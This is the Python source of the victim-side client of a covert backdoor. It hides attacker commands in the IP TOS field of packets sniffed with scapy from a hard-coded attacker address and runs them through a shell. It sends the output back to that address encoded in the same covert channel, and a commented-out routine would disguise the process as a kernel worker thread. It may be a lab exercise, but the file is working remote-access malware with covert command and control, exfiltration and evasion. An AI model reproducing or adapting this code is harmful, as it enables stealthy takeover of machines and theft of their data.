#!/usr/bin/env python
# ###################################################################
# vic.py 
# 
# main functions:
#	- 0. when this program is run, change the process name
#	- 1. send initial packet that backdoor client program is run to server
#	- 2. wait for command from backdoor server (sniffing)
#	- 3. extract the command data
#	- 4. excute the command data
#	- 5. get the result from command line
#	- 6. encrypt the data to send
#	- 7. send encrypted data to backdoor server
#	- 
# ###################################################################
from scapy.all import *
from encrypt import *
#from sniffer import *
#from sniffing import *
import argparse
import sys
import string
import threading
#from setproctitle import getproctitle, setproctitle

COMMAND = ""
CHECK_COUNT = 0
COUNT = 0
WAITING = 1
NETCARD = 'eno1'
KEY = "runningman"	# used for decryption
serv_addr = "192.168.0.9"	# hacker waits for client to run the program

# def change_proc():
# 	try:
# 		from setproctitle import getproctitle, setproctitle
# 	except ImportError:
# 		logging.warning(
# 		    ("Unable to set import 'setproctitle', "
# 		     "process name cannot be changed"))
# 	else:
# 		setproctitle("%s" % "[kworker/2:3><><><><><><]")


def counter():
	sniff(filter="src 192.168.0.9 and udp and dst port 8080 and src port 123", prn=get_count)

def get_count(pkt):
	global COUNT
	print "get_count(pkt):" 
	print pkt[IP].tos
	COUNT = pkt[IP].tos
	t = threading.Thread(target=get_data, args=(COUNT,))
	t.start()
	t.join()

def get_data(cnt):
	sniff(filter="src 192.168.0.9 and tcp and (dst port 80 and src port 123)", prn=recv_packet, count=cnt)

def recv_packet(pkt):
	global COMMAND
	global CHECK_COUNT
	count = 0

	try: 
		if pkt['Raw'].load is not None:
			count = int(pkt['Raw'].load)
		print "total length of command:", count
		CHECK_COUNT += 1
	except OSError as e:
		print e

	print "received value:", chr(pkt[IP].tos)
	COMMAND += chr(pkt[IP].tos)

	print "i value is", CHECK_COUNT
	# excute command
	if CHECK_COUNT == count:
		excute_command()
		CHECK_COUNT = 0



def excute_command():
	global COMMAND
	print "excute_command():", COMMAND
	
	# execute command
	p = subprocess.Popen(COMMAND, 
						shell=True,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						stdin=subprocess.PIPE)
	output, err = p.communicate()
	cmdOutput = output + err
	print cmdOutput

	# send command
	send_command(cmdOutput)
	COMMAND = ""


def send_command(cmd_string):
	print "send_command(cmd_string):"
	
	mypacket = IP()/fuzz(TCP())/str(len(cmd_string))
	mypacket.dst = serv_addr
	mypacket.sport = 123
	mypacket.dport = 80

	i = 0
	for c in cmd_string:
		mypacket.tos = ord(c)
		i += 1
		send(mypacket)

def main():
	global WAITING
	global COUNT
	# 0. when this program is run, change the process name
	#change_proc()
	
	# 1. send initial packet that backdoor client program is run to server
	send(IP(dst=serv_addr, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start', loop=0)
	

	# 2. wait for command from backdoor server (sniffing)
	# while True:
	# 	if WAITING == 1:
	# 		sniff(filter="tcp and (dst port 80 and src port 123)", prn=recv_packet, count=1)
	# 		WAITING = 0
	# 		continue
	# 	else: 		# WAITING = 0
	# 		WAITING = 1
	# 		continue

	#sniff(filter="tcp and (dst port 80 and src port 123)", prn=recv_packet)

	# check how many string wanna send
	sniff(filter="src 192.168.0.9 and tcp and (dst port 80 and src port 123)", prn=recv_packet)




if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")